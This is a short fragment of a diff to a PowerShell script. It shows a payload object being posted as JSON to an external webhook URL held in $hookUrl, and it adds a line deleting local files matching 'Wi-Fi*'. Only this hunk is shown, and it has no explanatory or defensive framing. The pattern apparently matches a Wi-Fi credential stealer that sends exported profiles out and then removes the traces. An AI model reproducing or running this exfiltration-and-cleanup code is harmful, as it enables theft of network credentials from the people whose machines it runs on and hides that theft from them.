@@ -27,3 +27,5 @@ $payload = [PSCustomObject]@{
 }
 
 Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json; charset=utf-8'
+
+Remove-Item Wi-Fi*
